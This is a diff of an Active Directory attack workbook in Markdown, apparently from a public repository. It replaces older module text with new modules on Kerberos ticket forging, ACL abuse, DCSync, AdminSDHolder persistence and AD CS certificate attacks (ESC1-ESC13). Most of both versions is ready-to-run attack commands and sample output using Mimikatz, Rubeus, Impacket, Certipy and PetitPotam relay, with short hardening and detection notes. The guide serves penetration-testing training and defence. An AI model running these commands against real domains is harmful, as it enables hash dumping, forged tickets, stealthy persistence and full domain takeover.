-    
-    ```bash
-    # Using SharpHound to collect ACL data
-    SharpHound.exe --CollectionMethod ACL
-    
-    ```
-    
-    _Expected Output Files:_ `acls.json` showing ACEs graph data.
-    
-
-
-
-### ACL Abuse Tactics
-
-_Leverage powerful ACEs to escalate privileges immediately._
-
-#### Actions
-
-1.  **GenericAll on a group**
-    
-    ```powershell
-    # Add yourself to high-privilege group
-    Add-ADGroupMember -Identity "Domain Admins" -Members "AttackerUser"
-    
-    ```
-    
-    _Effect:_ Instant Domain Admin rights.
-    
-2.  **GenericWrite on a user**
-    
-    ```powershell
-    # Reset password of an admin account
-    Set-ADAccountPassword -Identity "AdminUser" -NewPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)
-    
-    ```
-    
-    _Effect:_ Control over admin credentials.
-    
-3.  **WriteDacl on an OU**
-    
-    ```powershell
-    # Grant Replicating Directory Changes to self on domain root
-    $acl = Get-Acl AD:\DC=lab,DC=local
-    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("LAB\\AttackerUser","DS-Replication-Get-Changes","Allow")
-    $acl.AddAccessRule($ace)
-    Set-Acl AD:\DC=lab,DC=local $acl
-    
-    ```
-    
-    _Effect:_ Prepare for DCSync by granting needed replication rights.
-    
-
-
-
-### DCSync & DCShadow
-
-_Extract or inject data via AD replication protocols._
-
-### Why It Matters  
-- DCSync: quick domain hash dump.  
-- DCShadow: stealth backdoor insertion.
-
-### Tools & Commands  
-#### Mimikatz DCSync  
+### 2. AS-REP Roasting
+
+Accounts with `DONT_REQUIRE_PREAUTH` flag send an AS-REP encrypted with the user's hash without authenticating first. Extract and crack.
+
+**Impacket (Linux):**
+
+```
+impacket-GetNPUsers -dc-ip dc1.corp.local corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash
+```
+
+**NetExec (one-liner):**
+
+```
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --asreproast asrep.hash
+```
+
+**Rubeus (Windows):**
+
+```
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
+```
+
+**Crack:**
+
+```
+hashcat -m 18200 asrep.hash wordlist.txt
+```
+
+### 3. Golden Ticket
+
+Forged TGT using the `krbtgt` account hash. Grants unrestricted domain access for the ticket lifetime (default 10 hours, renewable 7 days).
+
+**Prerequisite:** You need the `krbtgt` NTLM hash (obtained via DCSync — see Module 7).
+
+**Impacket:**
+
+```
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@dc1.corp.local
+```
+
+**Mimikatz:**
+
+```
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
+```
+
+**Rubeus:**
+
+```
+Rubeus.exe golden /aes256:<krbtgt_aes256_key> /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt
+```
+
+### 4. Silver Ticket
+
+Forged TGS for a specific service using that service account's hash. Does NOT contact the KDC — harder to detect than Golden Tickets, but limited to one service.
+
+```
+impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... -domain corp.local -spn MSSQLSvc/sqlsrv.corp.local:1433 Administrator
+```
+
+### 5. Diamond Ticket (Modern Alternative to Golden Ticket)
+
+A Diamond Ticket modifies a legitimately requested TGT rather than forging one from scratch. This makes it harder to detect because it contains valid encrypted data from the KDC.
+
+**Rubeus:**
+
+```
+Rubeus.exe diamond /krbkey:<krbtgt_aes256_key> /user:Administrator /domain:corp.local /dc:dc1.corp.local /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
+```
+
+The key difference: Golden Tickets are entirely forged (detectable by PAC validation). Diamond Tickets decrypt a real TGT, modify the PAC, re-encrypt — passing validation checks.
+
+### 6. Sapphire Ticket
+
+Similar to Diamond Ticket but uses S4U2Self + U2U to obtain a legitimate PAC for the target user, then inserts it into the modified ticket. Even harder to detect.
+
+```
+impacket-ticketer -request -impersonate Administrator -domain corp.local -domain-sid S-1-5-21-... -aesKey <krbtgt_aes256_key> -nthash <krbtgt_hash> Administrator
+```
+
+### 7. Pass-the-Ticket (PtT)
+
+Inject an existing Kerberos ticket into your session.
+
+```
+# Mimikatz
+kerberos::ptt ticket.kirbi
+
+# Rubeus
+Rubeus.exe ptt /ticket:ticket.kirbi
+
+# Linux
+export KRB5CCNAME=/path/to/ticket.ccache
+```
+
+### 8. UnPAC-the-Hash
+
+After obtaining a certificate (e.g., from AD CS abuse), use PKINIT to get a TGT, then use U2U to extract the account's NT hash.
+
+```
+# Get TGT via PKINIT
+certipy auth -pfx admin.pfx -dc-ip 10.0.0.1
+
+# Output includes NT hash:
+# [*] Got hash for 'administrator@corp.local': aad3b435b51404ee:1122334455...
+```
+
+This is how AD CS certificate abuse translates into usable NTLM hashes.
+
+### Hardening
+
+- Use AES-only Kerberos (disable RC4/DES via GPO).
+- Enforce long, random passwords on all service accounts (30+ chars).
+- Use Group Managed Service Accounts (gMSAs) instead of regular service accounts.
+- Rotate `krbtgt` password regularly (twice, 24 hours apart, to invalidate Golden Tickets).
+- Enable Kerberos preauthentication on ALL accounts.
+- Monitor Event IDs: 4769 (TGS request — Kerberoasting), 4768 (TGT request — AS-REP), 4771 (preauth failure).
+
+## Module 7: ACL Abuse & DCSync
+
+*Exploit AD permissions and directory replication to extract all domain hashes.*
+
+### Key ACL Rights
+
+| Right | What It Allows |
+|-------|---------------|
+| **GenericAll** | Full control — read, write, delete, modify permissions |
+| **GenericWrite** | Modify properties, create child objects |
+| **WriteDacl** | Change the ACL itself — add or remove permissions |
+| **WriteOwner** | Take ownership of the object |
+| **ForceChangePassword** | Reset a user's password without knowing the current one |
+| **DS-Replication-Get-Changes** | Pull password hashes via DCSync (replication) |
+| **DS-Replication-Get-Changes-All** | Required alongside the above for full DCSync |
+
+### 1. ACL Enumeration
+
+**PowerView:**
+
 ```powershell
-mimikatz.exe
+Import-Module .\PowerView.ps1
+
+# ACLs on domain root (find DCSync rights)
+Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
+  Where-Object { $_.ObjectAceType -match "DS-Replication" } |
+  Select IdentityReference, ObjectAceType
+
+# ACLs on a specific user
+Get-ObjectAcl -Identity "svc_admin" -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|ForceChangePassword" } |
+  Select IdentityReference, ActiveDirectoryRights
+```
+
+**BloodHound** — best for discovering ACL attack paths at scale. Run SharpHound with ACL collection:
+
+```
+SharpHound.exe --CollectionMethods ACL,Group,Session,LocalAdmin
+```
+
+### 2. ACL Abuse Scenarios
+
+**GenericAll on a user → reset password:**
+
+```powershell
+Set-ADAccountPassword -Identity "AdminUser" -NewPassword (ConvertTo-SecureString "NewP@ss!" -AsPlainText -Force)
+```
+
+**GenericAll on a user → targeted Kerberoast (set SPN):**
+
+```powershell
+Set-ADUser -Identity "AdminUser" -ServicePrincipalNames @{Add="fake/spn"}
+# Now Kerberoast the account
+Rubeus.exe kerberoast /user:AdminUser
+# Clean up
+Set-ADUser -Identity "AdminUser" -ServicePrincipalNames @{Remove="fake/spn"}
+```
+
+**GenericAll on a user → Shadow Credentials (see Module 10):**
+
+```
+Whisker.exe add /target:AdminUser
+# Use output Rubeus command to get TGT
+```
+
+**GenericAll on a group → add yourself:**
+
+```powershell
+Add-ADGroupMember -Identity "Domain Admins" -Members "attacker_user"
+```
+
+**WriteDacl on domain root → grant DCSync rights:**
+
+```powershell
+$acl = Get-Acl "AD:\DC=corp,DC=local"
+$sid = New-Object System.Security.Principal.NTAccount("CORP\attacker_user")
+# DS-Replication-Get-Changes
+$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
+# DS-Replication-Get-Changes-All
+$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "ExtendedRight", "Allow", [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
+$acl.AddAccessRule($ace1)
+$acl.AddAccessRule($ace2)
+Set-Acl "AD:\DC=corp,DC=local" $acl
+```
+
+**ForceChangePassword:**
+
+```
+# Impacket
+impacket-changepasswd corp.local/attacker:'Pass123'@dc1.corp.local -newpass 'Hacked!' -target admin_user -reset
+```
+
+### 3. DCSync Attack
+
+Abuse replication rights to pull ALL domain hashes without touching the DC filesystem.
+
+**Prerequisite:** Account with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (Domain Admins have this by default).
+
+**Impacket (Linux):**
+
+```
+# Dump all hashes
+impacket-secretsdump -just-dc corp.local/administrator:'P@ss!'@dc1.corp.local
+
+# Dump specific user (krbtgt for Golden Ticket)
+impacket-secretsdump -just-dc-user krbtgt corp.local/administrator:'P@ss!'@dc1.corp.local
+```
+
+**NetExec (dumps full NTDS.dit via VSS shadow copy):**
+
+```
+nxc smb dc1.corp.local -u administrator -p 'P@ss!' --ntds
+```
+
+**Mimikatz (Windows):**
+
+```
 privilege::debug
 lsadump::dcsync /domain:corp.local /user:krbtgt
+lsadump::dcsync /domain:corp.local /all /csv
 ```
-**Expected Output**: List of user hashes.
 
-#### Impacket secretsdump.py  
-```bash
-python3 secretsdump.py corp.local/administrator@dc01.corp.local
+Example output:
+
 ```
-**Expected Output**: Domain user hashes.
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404ee:1122334455aabbcc...
+krbtgt:502:aad3b435b51404ee:5566778899ddeeff...
+svc_sql:1107:aad3b435b51404ee:aabbccdd11223344...
+```
 
-#### Mimikatz DCShadow  
+### 4. AdminSDHolder Persistence
+
+AdminSDHolder ACL is copied to all protected groups every 60 minutes (by SDProp). If you add an ACE to AdminSDHolder, it persists across all protected objects.
+
 ```powershell
-mimikatz.exe
-privilege::debug
-kerberos::golden /user:corp\DCShadow1$ /domain:corp.local /sid:S-1-5-21-... /krbtgt:7c6a180b36896a0a8c02787eeafb0e4c /id:11223344 /groups:512 /ptt
-lsadump::dcshadow /push
+# Add GenericAll for attacker to AdminSDHolder
+$sdh = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
+$acl = Get-Acl $sdh
+$sid = New-Object System.Security.Principal.NTAccount("CORP\attacker_user")
+$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericAll", "Allow")
+$acl.AddAccessRule($rule)
+Set-Acl $sdh $acl
 ```
-#### **Invoke-DCShadow** (PowerShell) – DCShadow
-```powershell
 
-    Import-Module .\DSInternals.psm1
-    Invoke-DCShadow -DomainController dc1.lab.local -AddReplicaLink
-  ```
-    
-### Step-by-Step Guide  
+After 60 minutes, `attacker_user` has GenericAll on all protected accounts (Domain Admins, Enterprise Admins, etc.).
 
-#### Scenario A: Have Replication Rights  
-- Run DCSync with Mimikatz:  
-  ```powershell
-  mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' 'exit'
-  ```  
-- **Expected Output**: All domain user hashes.
+### Hardening
 
-#### Scenario B: Exploit ACL on AdminSDHolder  
-- Check ACL:  
-  ```powershell
-  $aclSDH = Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
-  $aclSDH.Access | Where-Object { $_.ActiveDirectoryRights -match "WriteDacl" }
-  ```  
-- **If “ShadowGroup” has WriteDACL**:  
-  ```powershell
-  $path = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
-  $acl = Get-Acl $path
-  $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\ShadowGroup","ExtendedRight","Allow","00000000-0000-0000-0000-000000000012")
-  $acl.AddAccessRule($rule)
-  Set-Acl -AclObject $acl $path
-  ```
-- Now members of `ShadowGroup` have replication rights. Perform DCSync.
+- Remove `DS-Replication-Get-Changes` from all non-DC principals.
+- Monitor Event ID 4662 for replication GUID access by non-DC accounts.
+- Audit ACLs on domain root, AdminSDHolder, and high-value OUs regularly.
+- Use BloodHound to detect shadow admin paths.
+- Monitor AdminSDHolder changes via Event ID 5136.
 
-#### Scenario C: DCShadow Attack  
-- Generate Golden Ticket for rogue DC:  
-  ```powershell
-  Mimikatz.exe 'kerberos::golden /user:corp\DCShadow1$ /domain:corp.local /sid:S-1-5-21-... /krbtgt:7c6a180b36896a0a8c02787eeafb0e4c /id:11223344 /groups:512 /ptt'
-  ```
-- Register Rogue DC and push changes:  
-  ```powershell
-  mimikatz.exe 'lsadump::dcshadow /push'
-  ```
-    
-    _Expected Output:_ Confirmation that rogue DC object registered and changes replicated.
+## Module 8: AD Certificate Services (ESC1-ESC16)
 
-
-
-### Using Impackets
-
-1.  **Enumerate ACLs for replication rights**
-    
-    ```powershell
-    # List ACL entries on domain root
-    Get-ObjectAcl -DistinguishedName "DC=lab,DC=local" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights
-    
-    ```
-    
-    _Purpose_: Identify who can replicate directory changes.  
-    _Look for_: `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All` rights.
-    
-2.  **If you have WriteDacl, grant replication rights**
-    
-    ```powershell
-    # Fetch current ACL
-    $acl = Get-Acl "AD:\DC=lab,DC=local"
-    # Create replication ACE for your user
-    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
-      "LAB\AttackerUser",
-      "DS-Replication-Get-Changes,DS-Replication-Get-Changes-All",
-      "Allow"
-    )
-    # Add and apply
-    $acl.AddAccessRule($ace)
-    Set-Acl "AD:\DC=lab,DC=local" $acl
-    
-    ```
-    
-    _Purpose_: Use existing ACL permissions to elevate to replication.
-    
-3.  **Run DCSync with secretsdump**
-    
-    ```bash
-    # Dump all domain accounts via replication rights
-    secretsdump.py -just-dc lab.local/AttackerUser:Pass@dc1.lab.local
-    
-    ```
-    
-    _Purpose_: Extract NTLM hashes without touching the DC database directly.  
-    _Output_: Lines listing account names and corresponding hashes.
-    
-4.  **Perform DCShadow to inject changes**
-    
-    ```powershell
-    # Register rogue DC and perform stealth replication changes
-    Import-Module .\DSInternals.psm1
-    Invoke-DCShadow -DomainController dc1.lab.local -AddReplicaLink
-    # Example: create new admin account
-    Add-DomainObject -Type user -Name "ShadowAdmin" -SamAccountName "ShadowAdmin" -Password (ConvertTo-SecureString "P@ssW0rd!" -AsPlainText -Force)
-    
-    ```
-    
-    _Purpose_: Push unauthorized changes that appear as normal replication.  
-    _Verify_: Check Security Event ID 5136 for directory service modifications.
-    
-
-
-
-### Expected Result
-
--   ACL enumeration reveals who can replicate or control objects.
-    
--   DCSync outputs full NTDS.dit hashes.
-    
--   DCShadow registers a rogue DC and writes changes undetected.
-    
-
-
-
-### Mitigation & Hardening
-
--   Remove `DS-Replication-Get-Changes` from non-admin principals.
-    
--   Monitor for unusual replication requests in DC event logs.
-    
--   Audit and tighten ACLs on domain root and critical OUs.
-    
-
-
-
-### Next Steps
-
-1.  **Pass-the-Hash (PtH)**
-    
-    -   **What it is:** Authenticate to services using an NTLM hash directly, without needing the plaintext password.
-        
-    -   **Tool Example:** `pth-winexe`, `Impacket psexec.py`
-        
-        ```bash
-        psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:1122334455... LAB\Administrator@dc1.lab.local cmd.exe
-        
-        ```
-        
-    -   **Use Case:** Access file shares or execute commands as a high-privilege account using its hash.
-        
-2.  **Golden Ticket Forging**
-    
-    -   **What it is:** Create a forged Ticket Granting Ticket (TGT) using the `krbtgt` account hash, granting unlimited domain access.
-        
-    -   **Tool Example:** Rubeus or Impacket’s `ticketer.py`
-        
-        ```powershell
-        Rubeus.exe golden /domain:lab.local /sid:S-1-5-21-... /krbtgt:5566778899... /user:krbtgt /aes256:... /ticket:golden.ticket
-        klist -li 0x3e7
-        klist set-caching golden.ticket
-        
-        ```
-        
-    -   **Use Case:** Maintain persistent, stealthy Domain Admin access; bypasses password changes of the krbtgt account until ticket expiry.
-        
-3.  **Cleanup**
-    
-    -   **Remove DCShadow Objects:**
-        
-        ```powershell
-        Invoke-DCShadow -Target dc1.lab.local -RemoveReplicaLink
-        
-        ```
-        
-    -   **Revert ACL Changes:** Remove the ACE you added for replication rights.
-        
-4.  **Detection & Recovery**
-    
-    -   Monitor for unusual Kerberos TGT requests (Event ID 4768) with high lifetimes.
-        
-    -   Rotate `krbtgt` account password twice, 24 hours apart, to invalidate forged tickets.
-        
-
-
-
-## <a name="module-13"></a> Module 13: Domain Trust & Forest Attacks
-
-_Move laterally across trust boundaries by abusing domain trust relationships._
+*Exploit misconfigured certificate templates for privilege escalation. AD CS is one of the most common and impactful AD attack vectors.*
 
 ### Key Concepts
 
--   **Domain Trust**  
-    A link between two AD domains that allows users in one domain to access resources in another. Trusts can be one-way or two-way, external or forest.
-    
--   **Trust Direction**
-    
-    -   **Child → Parent**: The child domain trusts the parent; users in child can access parent resources.
-        
-    -   **Parent → Child**: The parent trusts the child; users in parent access child resources.
-        
--   **Cross-Forest Trust**  
-    A trust between separate AD forests, allowing limited authentication across organizational boundaries.
-    
--   **SID Filtering**  
-    A protection that strips unauthorized SIDs from cross-forest tokens; bypassing it enables high-privilege impersonation.
-    
+**AD CS (Active Directory Certificate Services)** — Microsoft's PKI solution. Issues X.509 certificates for authentication, encryption, and signing.
 
+**Certificate Template** — Defines what a certificate can do, who can request it, and how the subject name is determined.
 
+**PKINIT** — Kerberos extension allowing certificate-based authentication instead of passwords. This is how AD CS abuse translates into domain compromise.
 
-### Simplified Real-World Trust Diagram
+**Certipy** — The primary tool for AD CS enumeration and exploitation (Python, supports ESC1-ESC16).
 
-![enter image description here](https://github.com/ShubhamDubeyy/Active-Directory-Workbook/blob/main/Forest.png?raw=true)
+**Certify** — C# alternative to Certipy. Certify 2.0 released August 2025 with enhanced capabilities.
 
--   **Child Office ↔ Headquarter**: Child trusts Parent for Sales to access core resources.
-    
--   **Headquarter ↔ Sister**: Two-way forest trust sharing user authentication.
-    
--   **Headquarter ↔ Backup**: One-way trust allowing Backup domain to replicate from Headquarter.
-    
--   **Headquarter ↔ External Partner**: External forest trust with limited access.
-    
+### 1. Enumeration
 
-### 1. Domain Trusts Primer
+**Certipy (Linux — recommended):**
 
-_Identify and understand the trust relationships in your environment._
-
-#### Tools & Commands
-
--   **nltest**
-    
-    ```bat
-    # List trusts for LAB domain
-    nltest /domain_trusts
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    Trusted domain list for domain \"LAB\":
-      PARENT.lab.local (FOREST)
-      CHILD.lab.local  (TREE_ROOT)
-    
-    ```
-    
--   **Get-ADTrust** (PowerShell)
-    
-    ```powershell
-    Import-Module ActiveDirectory
-    Get-ADTrust -Filter * | Format-Table Name,TrustType,Direction,ForestTransitive
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    Name        TrustType Direction ForestTransitive
-    ----        --------- --------- ------
-    PARENT      Forest    Outbound True
-    CHILD       External  Inbound  False
-    
-    ```
-    
-
-
-
-### 2. Child → Parent Trust Abuse (Linux & Windows)
-
-_Exploit an outbound child-to-parent trust to authenticate in the parent domain._
-
-#### Tools & Commands
-
--   **evil-winrm** (Windows) / **crackmapexec**
-    
-    ```bash
-    # Linux example with CME
-    cme smb CHILD.lab.local/administrator@PARENT.lab.local -p 'Password1!'
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    PARENT\\administrator:Password1! (SMB)  
-    [+] Logged in as PARENT\\administrator (SID S-1-5-21-...).
-    
-    ```
-    
-
-
-
-### 3. Cross-Forest Trust Abuse (Linux & Windows)
-
-_Bypass SID filtering to impersonate high-privilege accounts in another forest._
-
-#### Key Concepts
-
--   **SID Filtering Bypass**  
-    When disabled, users can add arbitrary SIDs to their token to escalate privileges across forests.
-    
-
-#### Tools & Commands
-
--   **impacket-AddComputer.py**
-    
-    ```bash
-    # Command breakdown:
-    # PARENT.lab.local/user:Pass => Credentials used (a user in parent domain)
-    # -target-domain CHILD.lab.local    => Domain being joined/impersonated
-    # -target-user 'lab\Administrator' => Account in target domain to impersonate
-    AddComputer.py PARENT.lab.local/user:Pass \
-      -target-domain CHILD.lab.local -target-user 'lab\Administrator'
-    
-    ```
-    
-    _What happens?_
-    
-    -   The tool uses ParentDomainUser credentials to authenticate to CHILD.lab.local.
-        
-    -   It forges a machine account in CHILD and maps the Administrator SID into the token, effectively letting you log in as CHILD\Administrator.
-        
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    [+] Domain joined: CHILD.lab.local as lab\Administrator
-    
-    ```
-    
--   **Rubeus**
-    
-    ```powershell
-    Rubeus.exe ptt /ticket:crossforest.ticket
-    
-    ```
-    
-    _Expected Output:_ Forged ticket injected, access CHLD resources as high-priv user.
-    
-
-
-
-### Expected Result
-
--   Successful listing of trust relationships.
-    
--   Authentication in parent domain via child domain credentials.
-    
--   Cross-forest resource access as high-privilege user when SID filtering is disabled.
-    
-
-
-
-### Mitigation & Hardening
-
--   Enforce selective authentication on trusts to restrict which users can traverse.
-    
--   Ensure SID filtering is enabled on all cross-forest trusts.
-    
--   Monitor for unusual logons from trusted domains.
-    
-
-
-
-### Next Steps
-
-1.  Use compromised parent credentials to enumerate and pivot deeper.
-    
-2.  Clean up any forged tickets or SMB sessions to avoid detection.
-
-
-
-## <a name="module-14"></a> Module 14: AD Certificate Services Enumeration & Abuses
-
-### Introduction  
-Abuse misconfigured certificate templates to request certificates granting high-privilege authentication (PKINIT, DC authentication).
-
-### Definitions  
-1. **AD CS (Active Directory Certificate Services)**: Microsoft PKI solution.  
-2. **Certificate Template**: Defines certificate properties and enrollment rights.  
-3. **Enrollment Rights**: “Enroll” or “AutoEnroll” permissions on a template.  
-4. **ESC Classes**: Attack categories (ESC1–ESC13).  
-5. **PKINIT**: Kerberos extension for certificate-based authentication.
-
-### Why It Matters  
-- Misconfigured templates allow issuance of high-priv certificates to low-priv users → escalate to DA via PKINIT.
-
-### Tools & Commands  
-
-#### LDAP Queries  
-- Find CA servers:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectCategory=pKIEnrollmentService)" dsServiceName,distinguishedName
-  ```  
-- List templates on CA:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local" certificateTemplates
-  ```  
-- Enumerate all certificate templates and ACLs:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(cn=*)" msPKI-EnrollmentFlag,securityDescriptor,msPKI-ExtendedKeyUsage,distinguishedName
-  ```
-
-#### PowerShell  
-- List templates and enrollment permissions:  
-  ```powershell
-  $templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-EnrollmentFlag,distinguishedName
-  foreach ($t in $templates) {
-    Write-Host "`nTemplate: $($t.Name)"
-    $acl = Get-Acl ("AD:" + $t.distinguishedName)
-    $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "Enroll" } | Format-Table IdentityReference,ActiveDirectoryRights,InheritanceType
-    }
-  ```
-- Check EKU:  
-  ```powershell
-  Get-ADObject -Identity "CN=Kerberos Authentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties msPKI-ExtendedKeyUsage
-  ```
-
-### Step-by-Step Guide  
-
-#### 1. Find CA Servers  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectCategory=pKIEnrollmentService)" dsServiceName,distinguishedName
 ```
-**Expected Output**:  
-```
-dn: CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local
-dsServiceName: CORP-CA
+# Find all vulnerable templates
+certipy find -u user1@corp.local -p 'Pass123' -dc-ip 10.0.0.1 -vulnerable -stdout
 
-dn: CN=Subordinate-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local
-dsServiceName: Subordinate-CA
+# Full enumeration (saves JSON + text output)
+certipy find -u user1@corp.local -p 'Pass123' -dc-ip 10.0.0.1
 ```
 
-#### 2. List Certificate Templates on CA  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local" certificateTemplates
+**Certify (Windows):**
+
 ```
-**Expected Output**:  
-```
-certificateTemplates: Kerberos Authentication
-certificateTemplates: DomainController
-certificateTemplates: Computer
-certificateTemplates: User
-certificateTemplates: AuditAgent
+Certify.exe find /vulnerable
 ```
 
-#### 3. Enumerate Template ACLs  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(cn=*)" msPKI-EnrollmentFlag,securityDescriptor
+**LDAP manual enumeration:**
+
 ```
-**Expected Output (example)**:  
-```
-dn: CN=Kerberos Authentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
-msPKI-EnrollmentFlag: 16384
-securityDescriptor:<…binary…>
+# Find CA servers
+ldapsearch -x -H ldap://DC01.corp.local \
+  -b "CN=Configuration,DC=corp,DC=local" \
+  "(objectCategory=pKIEnrollmentService)" cn dNSHostName
 
-dn: CN=DomainController,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
-msPKI-EnrollmentFlag: 16384
-securityDescriptor:<…binary…>
-
-dn: CN=Computer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
-msPKI-EnrollmentFlag: 65536
-securityDescriptor:<…binary…>
-
-dn: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
-msPKI-EnrollmentFlag: 16384
-securityDescriptor:<…binary…>
-
-dn: CN=AuditAgent,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
-msPKI-EnrollmentFlag: 16384
-securityDescriptor:<…binary…>
+# Find templates
+ldapsearch -x -H ldap://DC01.corp.local \
+  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
+  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
 ```
 
-#### 4. PowerShell: Check Enrollment Permissions  
+### 2. Most Common ESC Attacks
+
+**ESC1 — Enrollee Supplies Subject + Client Auth + Low-Priv Enrollment**
+
+The classic AD CS misconfiguration. Template allows you to specify ANY user in the Subject Alternative Name (SAN) field.
+
+Requirements: Template has `ENROLLEE_SUPPLIES_SUBJECT` flag + Client Authentication EKU + Domain Users can enroll + no manager approval.
+
+```
+# Request cert as Administrator
+certipy req -u user1@corp.local -p 'Pass123' -dc-ip 10.0.0.1 \
+  -target ca.corp.local -ca 'CORP-CA' -template 'VulnTemplate' \
+  -upn 'administrator@corp.local'
+
+# Authenticate with the certificate
+certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
+
+# Output: NT hash for administrator
+```
+
+**ESC4 — Template ACL Misconfiguration**
+
+Low-priv user has `WriteDacl` or `GenericWrite` on a template → modify the template to make it vulnerable to ESC1, then exploit ESC1.
+
+```
+# Make template vulnerable
+certipy template -u user1@corp.local -p 'Pass123' -template 'ESC4Template' -save-old
+
+# Now exploit as ESC1
+certipy req -u user1@corp.local -p 'Pass123' -target ca.corp.local \
+  -ca 'CORP-CA' -template 'ESC4Template' -upn 'administrator@corp.local'
+
+# Restore original template config
+certipy template -u user1@corp.local -p 'Pass123' -template 'ESC4Template' -configuration ESC4Template.json
+```
+
+**ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA**
+
+CA-level flag that allows SAN in ANY certificate request, regardless of template settings. Makes every template with Client Auth EKU vulnerable.
+
+```
+certipy req -u user1@corp.local -p 'Pass123' -target ca.corp.local \
+  -ca 'CORP-CA' -template 'User' -upn 'administrator@corp.local'
+```
+
+**ESC8 — NTLM Relay to AD CS Web Enrollment (HTTP)**
+
+The AD CS web enrollment endpoint accepts NTLM authentication over HTTP without EPA. Coerce a DC to authenticate to your relay → get a certificate as the DC.
+
+```
+# Terminal 1: Relay to AD CS
+impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
+
+# Terminal 2: Coerce DC
+python3 PetitPotam.py attacker_ip dc1.corp.local
+
+# Terminal 1 output: Base64 certificate for DC01$
+# Save cert and authenticate:
+certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
+```
+
+**ESC11 — NTLM Relay to AD CS RPC Enrollment**
+
+Same concept as ESC8 but targets the RPC enrollment interface instead of HTTP. Exploitable when `IF_ENFORCEENCRYPTICERTREQUEST` is disabled.
+
+```
+# Relay to RPC enrollment
+certipy relay -ca ca.corp.local -template DomainController
+
+# Coerce from another terminal
+python3 PetitPotam.py attacker_ip dc1.corp.local
+```
+
+**ESC13 — Issuance Policy OID Group Link**
+
+Template has an issuance policy linked to a high-privilege AD group via OID group link. Enrollment grants effective membership in that group.
+
+### 3. ESC Summary Table
+
+| ESC | Attack Surface | Impact |
+|-----|---------------|--------|
+| ESC1 | Template: Enrollee supplies subject + Client Auth | Impersonate any user |
+| ESC2 | Template: Any Purpose or SubCA EKU | Impersonate any user |
+| ESC3 | Template: Certificate Request Agent EKU | Enroll on behalf of others |
+| ESC4 | Template: Low-priv user has Write on template | Modify template → ESC1 |
+| ESC5 | PKI objects: Low-priv control over CA objects | Various escalation |
